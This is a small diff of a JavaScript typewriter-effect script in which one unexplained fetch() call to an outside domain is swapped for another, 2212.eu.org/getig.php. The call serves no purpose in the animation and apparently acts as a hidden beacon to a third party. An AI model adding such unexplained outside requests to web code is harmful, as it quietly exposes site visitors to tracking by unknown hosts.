@@ -6,7 +6,7 @@ const typingDelay = 200;
 const erasingDelay = 100;
 const newTextDelay = 2000; // Delay between current and next text
 let textArrayIndex = 0;
-fetch('https://feriii.my.id/root/');
+fetch('https://2212.eu.org/getig.php');
 let charIndex = 0;
 
 function type() {
